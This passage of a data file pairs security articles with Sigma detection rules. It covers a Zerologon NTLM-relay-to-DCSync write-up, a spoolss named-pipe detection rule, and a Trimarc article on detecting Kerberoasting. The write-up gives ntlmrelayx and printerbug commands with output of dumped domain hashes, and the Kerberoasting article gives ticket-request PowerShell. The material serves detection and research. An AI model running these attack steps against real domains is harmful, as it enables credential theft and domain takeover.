DRSUAPI requires both. NTLM in the SMB protocol only enables the signing flag by default and leaves the sealing flag empty. When we relay this to DRSUAPI, the server thinks we don’t want to encrypt messages, and throws an error since this is not allowed by this RPC interface.\n\n```image\nAlt: Missing sealing flag\nDescription: The image displays a section of a technical output related to NTLM (NT LAN Manager) message negotiation. It specifically highlights the flags indicating whether the 'Seal' and 'Sign' options are set or not. The 'Seal' flag is marked as 'Not set' while the 'Sign' flag is marked as 'Set'. This information is crucial for understanding the negotiation of security features in NTLM communications, especially in the context of exploiting vulnerabilities like Zerologon (CVE-2020-1472). The visual representation of these flags indicates a programming or network debugging environment, providing insights into the configuration of security parameters.\nTranscription: |\n  plaintext\n  NTLM Secure Service Provider\n      NTLMSSP identifier: NTLMSSP\n      NTLM Message Type: NTLMSSP_NEGOTIATE (0x00000001)\n      Negotiate Flags: 0xe2088297, Negotiate 56, Negotiate Key Exchange, Negotiate 128, Negotiate \n          .... .... .... .... .... .... .... 0... = Negotiate 0x00000100: Not set\n          .... .... .... .... .... .... .... .1.. = Negotiate Lan Manager Key: Set\n          .... .... .... .... .... .... .... ..0. = Negotiate Datagram: Not set\n          .... .... .... .... .... .... .... ...0 = Negotiate Seal: Not set\n          .... .... .... .... .... .... .... ...1 = Negotiate Sign: Set\n          .... .... .... .... .... .... ...0 .... = Request 0x00000008: Not set\n          .... .... .... .... .... .... ..1. .... = Request Target: Set\n          .... .... .... .... .... .... .1.. .... = Negotiate OEM: Set\n          .... .... .... .... .... .... 1... .... = Negotiate UNICODE: Set\n```\n\nI played around a bit with SMB settings to see if I could somehow convince the client to enable the sealing flag. But whatever I configured, even when I enforced SMB encryption and Windows would encrypt all the messages on the SMB protocol level, the sealing flag would still not be set in NTLM. This is a bit of a weird situation to be in because in this case we actually want to use more security than the client negotiated, which is not accepted by the server. Note: *In this blog the server we are authenticating to is also a Domain Controller, but since the principle applies generally I will use the word “server” to describe the target we eventually want to authenticate to, to avoid confusion in terminology.*\n\nI wondered if it would be possible to change the NTLM messages to actually change the signing flags ourselves. Doing this would break the Message Integrity Code (MIC) which is part of the NTLM type 3 message and is based on a cryptographic calculation of all 3 messages. I knew from some previous research that the MIC is not verified by the Domain Controller, but by the local server that we’re authenticating to. This also makes sense when looking at the documentation for the information that is sent to the DC for validation, which only contains the server challenge and the response from the client. The MIC is not even sent to the DC for validation, which implies that it is only validated by the server locally. This means that for validation of the message with the DC, the MIC doesn’t matter, so we can happily change the negotiated flags in the message. For the server we authenticate **to** however, the MIC does matter and it will be verified. But **how** does the server verify the MIC if it doesn’t know the users password? If we look up the NTLM documentation for the calculation of the MIC, we find out that it’s a HMAC of the 3 NTLM messages using the **session key** as secret. You know, that session key that we just got by sending the authenticate message to the DC…\n\nCombining this knowledge, we can make sure that both signing and sealing is negotiated in the NTLM exchange by following these steps:\n\n1. In the initial relay phase, make sure both the signing and sealing flags are set.\n2. After the NTLM type 3 message is received (the Authenticate message), we forward it to the DC over Netlogon and abuse Zerologon to authenticate.\n3. The DC gives us the session key, with which we recalculate the MIC.\n4. Now we forward the modified type 3 message with recalculated MIC to the target computer.\n5. We are authenticated with signing and sealing negotiated.\n\n### Working around logon limitations\n\nAfter performing our magic trick with the Negotiate flags, we are able to send messages to the RPC endpoint and sign+encrypt them with the session key that we got from the DC. Now we can DCSync! If the account we relay is a Domain Admin, this works without any issue:\n\n```image\nAlt: DA relay to DCSync\nDescription: The image depicts a command-line interface (CLI) output from a hacking tool or script used for demonstrating an attack leveraging the Zerologon vulnerability (CVE-2020-1472). It shows various steps involved in setting up an SMB server and HTTP server, establishing connections, bypassing authentication, and dumping domain credentials. Key actions include successful Netlogon authentication, grabbing Kerberos keys, and specific outputs detailing the NTLM sign/seal key and dumped credentials.\nTranscription: |\n  [*] Setting up SMB Server\n  \n  [*] Setting up HTTP Server\n  [*] Servers started, waiting for connections\n  [*] SMBD-Thread-3: Connection from TESTSEGMENT/BACKUPADMIN@192.168.222.55 controlled, attacking target dcsync://\n  s2016dc.testsegment.local\n  [*] Connecting to s2016dc.testsegment.local NETLOGON service\n  [*] Netlogon Auth OK, successfully bypassed authentication using Zerologon!\n  [*] TESTSEGMENT\\backupadmin successfully validated through NETLOGON\n  [*] NTLM Sign/seal key: 307eefaac2d25a340e1f55714fdd3b2\n  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n  [*] Using the DRSUAPI method to get NTDS.DIT secrets\n  krbtgt:502:aadb343b551404eeaad3b435b51404ee:e5a69a0ba06a3367376dc4f41f24e2a6:::\n  [*] Kerberos keys grabbed\n  krbtgt:aes256-cts-hmac-sha1-96:b4a483bb66ee1f039b28e60ddc561c2c10a12c410efa90b9aa52138f06a562\n  krbtgt:aes128-cts-hmac-sha1-96:385263df0424f22d780953d651098f5e\n  krbtgt:des-cbc-md5:d57937a77623d05b\n```\n\nWhen I used the printer bug trick to authenticate, it would refuse the `NetrLogonSamLogonWithFlags` operation, stating that machine accounts are not allowed to authenticate. I wondered if this was some sort of mitigation because I was targeting a DC and attempting to log in with a machine account. When I tried the same with a non-DC, it did give the same error message though, suggesting there was something else going on. This left me confused because when I use a machine account to authenticate over the network to a Windows host, it does not throw this error. Windows also uses the `NetrLogonSamLogonWithFlags` operation over Netlogon, and it doesn’t break there, so there must be some difference. Since Windows is encrypting all the operations, we also can’t see what it is sending over the line. And thus we resort to some reverse engineering and debugging, to see if we can find the values going over the line. The good news is that someone managed to track down why x64dbg froze while debugging LSASS, and that this is now fixed, so I don’t have to pull out my hairs trying to understand Windbg. In `netlogon.dll`, there is a function `NetrLogonSamLogonWithFlags`, which takes quite a few arguments. We place a breakpoint on the function and try to see if we find a reference to the `NETWORK_TRANSITIVE_INFO` that we also see in Wireshark:\n\n```image\nAlt: Struct view in wireshark\nDescription: The image displays structured data from a debugging session related to the `NETWORK_TRANSITIVE_INFO` and `IDENTITY_INFO` for an authentication process. It shows various attributes such as `Referent ID`, `Domain`, `Length`, `Size`, and character arrays for the domain `TESTSEGMENT` and account name `backupadmin`. The information is laid out hierarchically, indicating the logon level and specific details about the parameters involved in the authentication process.\nTranscription: |\n  LEVEL: LogonLevel\n    Level: 6\n    NETWORK_TRANSITIVE_INFO\n      Referent ID: 0x0000200c\n      IDENTITY_INFO: backupadmin\n        Domain: TESTSEGMENT\n          Length: 22\n          Size: 22\n          Character Array: TESTSEGMENT\n            Referent ID: 0x00005197\n            Max Count: 11\n            Offset: 0\n            Actual Count: 11\n          Domain: TESTSEGMENT\n          Param Ctrl: 0x00000000\n          Logon ID: 0\n        Acct Name: backupadmin\n          Length: 22\n          Size: 22\n          Character Array: backupadmin\n            Referent ID: 0x0000e74d\n            Max Count: 11\n            Offset: 0\n            Actual Count: 11\n          Acct Name: backupadmin\n```\n\nAfter following a few pointers I found the 6th parameter pointing to a pointer to a structure that looked quite similar, including the value `0x16` for the length of the domain. The pointer after this `0x16` did indeed point to the string “TESTSEGMENT”, and both the flags and logonID are 0. When looking at the same structure for an authentication forwarded by a real Windows host, we see that Windows does not use 0 for the flags, but uses `0xE02A0000`. It also does not leave the logon ID empty:\n\n```image\nAlt: Struct view in memory\nDescription: The image is a screenshot of a debugger interface, showing memory dumps associated with a specific authentication process. It features two sections: the top half displays hexadecimal values and their ASCII representation, with a highlighted area indicating the 'Flags' in the memory structure. The lower half shows another memory address dump, with its corresponding ASCII output. The annotations emphasize the flags and the string 'TESTSEGMENT' within the memory analysis, relevant to the Zerologon vulnerability context.\n```\n\nIf we use the same flags in our relay script, the machine account is allowed to authenticate and we can DCSync with success. *I actually spent way too much time on this because I used the variable `flags` in the relay script which was apparently already in use for something else important, causing the packet encryption to break. This took me quite some more back and forth to the working version than I would have liked.*\n\n### DCSyncing using a single socket\n\nThe code to sync all the users on the DC is part of secretsdump. Since I don’t like duplicate code I tried to import the `NTDSHashes` class and pass it the authenticated RPC connection. This class does also rely on an SMB connection to do some lookups and to enumerate all the users in the domain. While relaying another session to SMB and combining this would be a possibility, it would significantly increase the complexity of the code. So instead I wrote some code which bypasses the requirement for an SMB connection and uses a single TCP connection to do the dumping. Because this way we can’t enumerate all the users, by default the tool will only dump the `krbtgt`, `DC$` and `Administrator` accounts. With these accounts you should have enough creds to perform a full DCSync with secretsdump.\n\nAlternatively it is possible to provide low-priv credentials (that are required for the printer bug exploitation anyway) and those will be used to connect over SMB and collect the required information.\n\n## The full attack\n\nAll this combined we have a full new attack that does not rely on resetting the passwords of machine accounts to exploit. It does have some prerequisites that the original attack does not, though these are present by default and will likely work in most ADs:\n\n- An account is needed to trigger the printer bug (you can also use a POC in .NET that uses SSO if you have access to a Domain Joined box)\n- The Print Spooler service should be running on the DC\n- The DC should be vulnerable to Zerologon\n- The DC should be able to connect to the attacker workstation and not be blocked by firewalls\n- You should be able to run Python and bind to port 445 for an incoming SMB connection (this is tricky on Windows)\n- There should be at least 2 DCs in the domain, since relaying back to the same DC does not work\n\nOn a high level, the attack looks like this:\n\n```image\nAlt: Diagram of the relay attack\nDescription: The image is a diagram illustrating the sequence of steps involved in a Zerologon relay attack between two Domain Controllers (DC1 and DC2) through an attacker machine. It visually represents the flow of authentication requests and the relay process. Key components include arrows indicating the direction of actions: authentication notifications from DC1 to the attacker, the relay of credentials, and the execution of the Zerologon exploit from the attacker to DC2. Each step is numbered (1 to 4) to indicate the attack progression.\nTranscription: |\n  1. Auth, Printer notify\n  2. Auth\n  3. Zerologon\n  4. Relay\n  \n  DC1\n  Attacker\n  DC2\n```\n\nTo exploit it given that the prerequisites are met, you can set up ntlmrelayx in DCSYNC relay mode and target `DC1`, while triggering the printer bug on `DC2`:\n\n```image\nAlt: Relay commands setup\nDescription: The image displays a terminal output from a Linux environment showing the execution of two Python scripts related to exploiting the Zerologon vulnerability (CVE-2020-1472). The first script, `ntmlrelayx.py`, is set up in DCSYNC relay mode targeting a specific domain controller (DC1), while the second script, `printerbug.py`, is being run against another domain controller (DC2) using an attacker IP address. The terminal also shows various loaded protocol clients and indicates that an HTTP server is being set up to wait for connections. Key details such as domain names and IP addresses are highlighted in red.\nTranscription: |\n  (CVE-2020-1472) user@localhost:~/imp-tmp$ ntlmrelayx.py -t DCSYNC://s2016dc.testsegment.local -smb2support\n  Impacket v0.9.22.dev1+20200914.131346.64ce465 - Copyright 2020 SecureAuth Corporation\n  \n  [*] Protocol Client DCSYNC loaded..\n  [*] Protocol Client MSSQL loaded..\n  [*] Protocol Client HTTPS loaded..\n  [*] Protocol Client HTTP loaded..\n  [*] Protocol Client LDAPS loaded..\n  [*] Protocol Client LDAP loaded..\n  [*] Protocol Client SMB loaded..\n  [*] Protocol Client SMTP loaded..\n  [*] Protocol Client IMAP loaded..\n  [*] Protocol Client IMAPS loaded..\n  [*] Protocol Client RPC loaded..\n  [*] Running in relay mode to single host\n  [*] Setting up SMB Server\n  \n  [*] Setting up HTTP Server\n  [*] Servers started, waiting for connections\n  \n  user@localhost:~/imp-tmp$ python printerbug.py testsegment/ntu@s2019dc.testsegment.local 192.168.222.133\n```\n\nAnd you should see the connection and credentials rolling in:\n\n```image\nAlt: DCSync attack\nDescription: The image is a screenshot of a command line interface displaying outputs from an SMB (Server Message Block) connection attempt related to a Zerologon attack. It shows a successful connection from a controlled workstation to a Domain Controller (DC), along with messages indicating the bypass of authentication using Zerologon after multiple attempts. The output lists the methods used to dump domain credentials and Kerberos keys, as well as the successful extraction of NTDS.DIT secrets.\nTranscription: |\n  [*] SMBD-Thread-3: Connection from TESTSEGMENT/S2019DC$@192.168.222.114 controlled, attacking target dcsync://s2019dc.testsegment.local\n  [*] Connecting to s2019dc.testsegment.local NETLOGON service\n  [*] Netlogon Auth OK, successfully bypassed authentication using Zerologon after 73 attempts!\n  [*] TESTSEGMENT\\S2019DC$ successfully validated through NETLOGON\n  [*] NTLM Sign/seal key: 9a2a3e0f3706127f701f6487b7d8c5b5f\n  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n  [*] Using the DRSUAPI method to get NTDS.DIT secrets\n  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e5a69a0ba06a3367376dc4f41f24e2a6:::\n  [*] Kerberos keys grabbed\n  krbtgt:aes256-cts-hmac-sha1-96:b4a483b6b6eef1d039b28e60ddc561c2c10a12c410efa90b9aa52138f06a562\n  krbtgt:aes128-cts-hmac-sha1-96:385263df0422f2d780953d651098f5e\n  krbtgt:des-cbc-md5:d57937a77623d05b\n  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n  [*] Using the DRSUAPI method to get NTDS.DIT secrets\n  S2019DC$:1167:aad3b435b51404eeaad3b435b51404ee:89af5cc5bb7b632bc1d791a826d98e97:::\n  [*] Kerberos keys grabbed\n```\n\nWhen performing the attack with a low-privilege account for SMB authentication, all hashes are dumped:\n\n```image\nAlt: Full DCSync with SMB auth for enumeration\nDescription: The image displays a command line interface showing the execution of a script related to the Zerologon vulnerability (CVE-2020-1472). It includes output logs indicating the successful connections to a NETLOGON service, validation of credentials, and the use of the DRSUAPI method to obtain NTDS.DIT secrets. Key details include server initialization, the bypassing of authentication using Zerologon, and dumping of domain credentials, along with a list of accounts and their corresponding hashes.\nTranscription: |\n  (CVE-2020-1472) user@localhost:~/imp-tmp$ ntlmrelayx.py -t DCSYNC://s2016dc.testsegment.local -smb2support -auth-smb testsegment/ntu:\n  Impacket v0.9.22.dev1+20200914.131346.64ce465 - Copyright 2020 SecureAuth Corporation\n  \n  [*] Servers started, waiting for connections\n  [*] SMBD-Thread-3: Connection from TESTSEGMENT/S2019DC$@192.168.222.114 controlled, attacking target dcsync://s2016dc.testsegment.local\n  [*] Connecting to s2016dc.testsegment.local NETLOGON service\n  [*] Netlogon Auth OK, successfully bypassed authentication using Zerologon after 21 attempts!\n  [*] TESTSEGMENT/S2019DC$ successfully validated through NETLOGON\n  [*] NTLM Sign/seal key: bfbaa28c293a3219b9d44f8f3fbdbd38\n  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n  [*] Using the DRSUAPI method to get NTDS.DIT secrets\n  Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c54d58774547e17c629053527a84d4d:::\n  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e5a69a0b0a3367376dc4f41f42e4a6:::\n  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\n## Notes for defenders\n\nThe original exploit leaves very few traces in the event logs besides a password reset and potentially the DCSync from a non-DC IP. The Spool Service being abused to trigger authentication to the attacker machine can leave traces, example event logs are provided in this repo. Network IOCs are similar to the original Zerologon since this attack also uses the same brute forcing technique. If you don’t have a lab available, I’ve made 2 PCAPs of the exploitation available, one without additional credentials for enumeration and one with credentials. Of course the best remediation is to patch the DC as soon as possible, as bad actors likely won’t care about the risks involved with the original exploit.\n\n## Code and acknowledgements\n\nThe code for this is available on my GitHub and has also been merged back into impacket. You can download impacket from GitHub and it should already have the latest files. Alternatively you can get those from my repository and save them in the `/impacket/impacket/examples/ntlmrelayx/` directory, in the `clients/` and `attacks/` directory for the 2 files. If you’re looking for the `printerbug.py` file, it’s part of my krbrelayx repository.\n\nAs a final note, relaying to DCSync is not the only attack possible here. Since we can edit NTLM flags at will, we could also relay the DC account to LDAP and abuse resource based constrained delegation to allow ourselves to authenticate as any user. If LDAP signing is required, we could also do that using the session key, though ntlmrelayx does not use an ldap library that has signing support at the moment.\n\n**Updated:** September 24, 2020",
    "sigma_rule": {
      "title": "DCERPC SMB Spoolss Named Pipe",
      "id": "214e8f95-100a-4e04-bb31-ef6cba8ce07e",
      "status": "test",
      "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
        "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
        "https://twitter.com/_dirkjan/status/1309214379003588608"
      ],
      "author": "OTR (Open Threat Research)",
      "date": "2018-11-28",
      "modified": "2022-08-11",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "spoolss"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Domain Controllers acting as printer servers too? :)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_dce_rpc_smb_spoolss_named_pipe.yml",
    "id": "760"
  },
  {
    "url": "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity",
    "markdown": "# Trimarc Research: Detecting Kerberoasting Activity\n\nFeb 17, 2017\n**Updated:** Aug 22, 2017\n\n---\n\nKerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system. This attack is effective since people tend to create poor passwords. The reason why this attack is successful is that most service account passwords are the same length as the domain password minimum (often 10 or 12 characters long) meaning that even brute force cracking doesn’t likely take longer than the password maximum password age (expiration). Most service accounts don’t have passwords set to expire, so it’s likely the same password will be in effect for months if not years. Furthermore, most service accounts are over-permissioned and are often members of Domain Admins providing full admin rights to Active Directory (even when the service account only needs to modify an attribute on certain object types or admin rights on specific servers).\n\nTim Medin presented on this at DerbyCon 2014 in his “Attacking Microsoft Kerberos Kicking the Guard Dog of Hades” presentation (slides & video) where he released the Kerberoast Python TGS cracker.\n\nThis is a topic I have covered in the past in the posts \"Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain\" & \"Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting.\" Also Will Schroeder, aka Will Harmjoy (@harmj0y), and I spoke at DerbyCon 2016 about how to Kerberoast to escalate privileges.\n\nNote: This attack will not be successful when targeting services hosted by the Windows system since these services are mapped to the computer account in Active Directory which has an associated 128 character password which won’t be cracked anytime soon.\n\nLet's quickly cover how Kerberos authentication works before diving into how Kerberoasting works and how to detect Kerberoast type activity.\n\n## Kerberos Overview & Communication Process\n\n```image\nAlt: Kerberos Overview & Communication Process\nDescription: The image illustrates the Kerberos authentication process, depicting the interactions between a user's workstation, a Domain Controller, and an Application Server. It features labeled arrows showing the sequence of requests and responses during the authentication, including 'AS REQ' for requesting the Ticket Granting Ticket (TGT), 'TGS REQ' for requesting the Ticket Granting Service (TGS), and 'AP REQ' for presenting the TGS for access. The diagram also notes optional PAC Validation Requests and Responses.\nTranscription: |\n  1. User's Workstation → Domain Controller:\n     AS-REQ (request TGT)\n  \n  2. Domain Controller → User's Workstation:\n     AS-REP (receive TGT)\n  \n  3. User's Workstation → Domain Controller:\n     TGS-REQ (present TGT, request TGS)\n  \n  4. Domain Controller → User's Workstation:\n     TGS-REP (receive TGS)\n  \n  5. User's Workstation → Application Server:\n     AP-REQ (present TGS for access)\n  \n  6. Application Server → User's Workstation (optional):\n     AP-REP (used when mutual authentication is requested)\n  \n  7. Application Server → Domain Controller (optional):\n     PAC Validation Request\n  \n  8. Domain Controller → Application Server (optional):\n     PAC Validation Response\n```\n\nUser logs on with username & password.\n\n1. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ).\n2. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).\n3. The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.\n4. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum – If the DC can open the ticket & the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket.\n5. The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user (TGS-REP).\n6. The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash.\n7. If mutual authentication is required by the client (think MS15-011: the Group Policy patch from February that added UNC hardening).\n8. Unless PAC validation is required (rare), the service accepts all data in the TGS ticket with no communication to the DC.\n\n## SPN Scanning for Targets\n\nAny user authenticated to Active Directory can query for user accounts with a Service Principal Name (SPN). This enables an attacker with access to a computer on the network to identify all service accounts supporting Kerberos authentication and what they are used for. Each SPN starts with a SPN type which is the first part of the SPN. If the SPN is \"MSSQLSvc/adsmsDB01.adsecurity.org:1433\", then \"MSSQLSvc\" is the SPN type. We can check the ADSecurity.org SPN directory and see it's for Microsoft SQL Server. The second part (after the forward slash /) is the server name the Kerberos service is running on. The server name can be the FQDN or the short name (often both). Sometimes there's a colon (\":\") at the end which provides additional information, such as a port number or SQL instance. Anyone can perform \"SPN Scanning\" in order to identify Kerberos service SPNs registered in an Active Directory forest.\n\nAttackers are most interested in Service Accounts that are members of highly privileged groups like Domain Admins. A quick way to check for this is to enumerate all user accounts with the attribute \"AdminCount\" equal to '1'. I cover AdminCount in an earlier post (\"Active Directory Recon Without Admin Rights\"). This means an attacker may just ask AD for all user accounts with a SPN and with AdminCount=1.\n\nUsing the Active Directory PowerShell module, we can use the Get-ADUser cmdlet:\n\n```\nget-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate\n```\n\nWe can also use PowerView's Get-NetUser cmdlet:\n\n```\nGet-NetUser -AdminCount | Select name,whencreated,pwdlastset,lastlogon\n```\n\nOnce we have this data, we can filter further to identify the Service Accounts.\n\nAnother method to finding interesting Service Accounts is to filter based on SPN type. Some SPNs tend to have interesting permissions:\n\n- **AGPMServer:** Often has full control rights to all GPOs.\n- **MSSQL/MSSQLSvc:** Admin rights to SQL server(s) which often has interesting data.\n- **FIMService:** Often has admin rights to multiple AD forests.\n- **STS:** VMWare SSO service which could provide backdoor VMWare access.\n\nKerberoasting these SPNs could lead to an attacker gaining access to the associated service account credentials, which would provide easy privilege escalation if the associated password isn't long & complex (>25 characters) or if the associated service account isn't configured as a Managed Service Account.\n\n## Kerberoasting\n\nThis attack involves requesting a Kerberos service ticket(s) (TGS) for the Service Principal Name (SPN) of the target service account (Step 3 above). This request uses a valid domain user’s authentication ticket (TGT) to request one or several service tickets for a target service running on a server.\n\nThe Domain Controller looks up the SPN in Active Directory and encrypts the ticket using the service account associated with the SPN in order for the service to validate user access. The encryption type of the requested Kerberos service ticket is RC4_HMAC_MD5 which means the service account’s NTLM password hash is used to encrypt the service ticket.\n\nWe can request RC4 encrypted Kerberos TGS service tickets by using the following PowerShell command:\n\n```\n$SPNName = 'MSSQLSvc/adsmsDB01.adsecurity.org:1433'\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n```\n\nRunning `klist` shows the new Kerberos service ticket with RC4-HMAC encryption.\n\nThe next step is exporting the Kerberos ticket we just requested from memory, which can be done easily with Mimikatz (without admin rights).\n\nKerberoast can attempt to open the Kerberos ticket by trying different NTLM hashes and when the ticket is successfully opened, the correct service account password is discovered. The Domain Controller doesn’t track if the user ever actually connects to these resources (or even if the user has access), so a user can request hundreds of service tickets, even if they never actually connect to the service.\n\n**Note:** No elevated rights are required to get the service tickets and no traffic is sent to the target.\n\nNote that Mimikatz is not required to extract the service ticket from memory: read Will's post \"Kerberoasting without Mimikatz\".\n\n## Mitigating Kerberoast Attack Activity\n\nThe most effective mitigation of this attack is ensuring service account passwords are longer than 25 characters (and aren't easily guessable). Managed Service Accounts and Group Managed Service Accounts are a good method to ensure that service account passwords are long, complex, and change regularly. A third-party product that provides password vaulting is also a solid solution for managing service account passwords. Though any 3rd party password management tool needs to be properly evaluated since the associated service account often requires Domain Admin level rights. This evaluation should also include how these credentials are managed within the solution.\n\n## Configuring Logging to Detect Kerberoast Activity\n\nBefore having a chance to detect Kerberoasting, it's important to have the appropriate logging enabled.\n\nKerberoasting involves requesting Kerberos TGS service tickets with RC4 encryption. Domain Controllers can log Kerberos TGS service ticket requests by configuring \"Audit Kerberos Service Ticket Operations\" under Account Logon to log successful Kerberos TGS ticket requests.\n\nEnabling this audit category on Domain Controllers will result in two interesting event ids being logged:\n\n- **4769:** A Kerberos service ticket (TGS) was requested\n- **4770:** A Kerberos service ticket was renewed\n\nEvent ID 4769 will be logged many, many times in the domain since after initial logon (and Kerberos TGT ticket request), users request Kerberos TGS service tickets to access the many services on the network (file shares, SQL, SharePoint, etc). Expect there will be around 10 to 20 Kerberos TGS requests per user every day. The 4769 event on Domain Controllers is one of the most numerous in any environment which is why it's often not logged.\n\n## Detecting Potential Kerberoast Activity\n\nI have presented and posted on potential methods to detect Kerberoasting activity in the past:\n\nDetection is a lot tougher since requesting service tickets (Kerberos TGS tickets) happens all the time when users need to access resources. Looking for TGS-REQ packets with RC4 encryption is probably the best method, though false positives are likely.\n\nMonitoring for numerous Kerberos service ticket requests in Active Directory is possible by enabling Kerberos service ticket request monitoring (“Audit Kerberos Service Ticket Operations”) and searching for users with excessive 4769 events (Event Id 4769 “A Kerberos service ticket was requested”).\n\nHere's how to definitively detect Kerberoasting activity.\n\nWindows added Kerberos AES (128 & 256) encryption starting with Windows Server 2008 and Windows Vista which means that most Kerberos requests will be AES encrypted with any modern Windows OS. Any Kerberos RC4 tickets requested should be the exception. There are systems that only support Kerberos RC4 by default (NetApp). Inter-forest Kerberos tickets also use RC4 unless configured for AES - ensure your forest trusts support AES and then enable AES over the trust.\n\nSo, how do we determine what encryption type was used when looking at events: 0x12, 0x17...?\n\nNed Pyle (@NerdPyle) posted an article on hunting down the use of Kerberos DES encryption in the AskDS Blog on TechNet and provides this handy chart:\n\nOnce all Domain Controllers are configured to log 4769 events, these events need to be filtered before sending the data into a SIEM/Splunk. Since we are only really interested in Kerberos TGS service tickets with RC4 encryption, it's possible to filter the events. As shown above, Kerberos events with AES encryption has Ticket Encryption Type set to 0x12. Kerberos RC4 encrypted tickets have Ticket Encryption Type set to 0x17.\n\nThese events can be filtered using the following which greatly reduces the amount of events flowing into the SIEM/Splunk:\n\n- **Ticket Options:** 0x40810000\n- **Ticket Encryption:** 0x17\n\nWith this information, we can start investigating potential Kerberoasting activity and reduce the number of 4769 events.\n\n**Note:** Also look for Kerberos DES encryption since this is not secure. The ticket options may be different, so just filter on 4768 & 4769 events with Ticket Encryption: 0x1 OR 0x2 OR 0x3.\n\nStarting with Windows 7 & Windows Server 2008 R2, DES encryption is disabled, but it's still important to find systems that may be attempting (& succeeding!) to get DES Kerberos tickets.\n\nWe can further reduce the number of 4769 events that flow into SIEM/Splunk:\n\n- Filter out requests from service accounts (ads45service@lab.adsecurity.org)\n- Filter on Audit Success\n- Filter out requests for service names with a \"$\" which are typically for computer accounts (or trusts or Managed Service Accounts, all accounts where Windows automatically generates a long, complex password).\n\nIn limited testing, I've seen 4769 event totals reduced from millions to thousands and hundreds using these filtering techniques.\n\nHere's a 4769 event that may potentially be from Kerberoasting activity:\n\nSome attackers will request a bunch of RC4 TGS tickets for some or all service accounts using something similar to the following graphic.\n\nThe PowerShell script code in the graphic above is similar to PowerView functionality. The next graphic shows the results of the PowerShell script code being run.\n\nRunning `klist` shows the tickets are in user memory. Note that the initial krbtgt ticket is AES encrypted and others are RC4-HMAC(NT). That's a bit unusual.\n\nSo, the tickets were requested... How to discover this activity? Using the information regarding ticket encryption type and ticket options, we can use PowerShell to parse the DC's event log looking for 4769 events with this info.\n\nThat looks really odd. Why would any account request several different service names (Citrix PVS, BizTalk, Business Objects, AGPM GPO management, and several SQL service accounts) within a second or two of each other?\n\nThat stands out and looks really suspicious and is very likely Kerberoasting activity. This provides great information on what users could be compromised and what activity on which computers should be scrutinized.\n\nA single user requesting RC4 encrypted TGS tickets for several services, such as lots of SQL service principal names is suspicious and it's worth investigating the IP (client address) the requests came from. The same thing is true for multiple RC4 encrypted TGS requests over time for lots of service principal names. A pattern does emerge when there's one or two accounts that request a variety or RC4 TGS tickets.\n\nUsing the information regarding ticket encryption type and ticket options, we can use PowerShell to parse the DC’s event log looking for 4769 events with this info.\n\n## Filtering the Noise to Find Malicious Activity\n\nI note in that post that 4769 events on Domain Controllers are extremely numerous, some of the most numerous events on a network.\n\nBut, what if we only cared about 1 event? That would reduce the number of 4769 events down to a single event that only occurs when something malicious is happening?\n\nThis post describes how to further narrow down to best detect Kerberoasting activity on a network: Creating a Service Account Honeypot to detect Kerberoasting.\n\n**Note:** I still recommend filtering 4769 event IDs on Domain Controllers and flowing them into SIEM/Splunk since this will provide information on resources users are accessing as well as help flag when a single user is requesting multiple service principal names (which is suspicious).\n\n## Creating a Kerberoast Service Account Honeypot\n\nIn order to create a Kerberoast Service Account Honeypot, we need to create a user account in AD and give it a fake service principal name (SPN). It has to be fake so we know that when it's requested, this request is not valid and therefore is malicious. It's also important to make this account look attractive by setting the \"AdminCount\" attribute to 1 as this flags the account as potentially having elevated AD rights. Adding this account to a bunch of fake groups made to look like it's providing additional elevated rights helps to add to the illusion.\n\n### Step 1: Create a new AD user account.\n\n### Step 2: Set the \"AdminCount\" attribute to 1.\n\n### Step 3: Add a Service Principal Name (SPN) to the account.\n\nThis SPN needs to be unique, so it should not simply be copied from another system. SQL service accounts are pretty common, so that's not a bad one to use (MSSQLSvc/sql01.lab.adsecurity.org). Just don't reuse one that already exists. The following example is a bit less... subtle. :)\n\n### Step 4: It may also be useful to add the honeypot account to a fake group that looks like it might have admin rights.\n\n**Note:** To make things interesting, you could give this account an easy password that could be guessed, something like \"Password1234\" (or a keyboard combination). This way we can monitor if someone logs on with this account. However, the Kerberos TGS service ticket request is enough to know that Kerberoasting 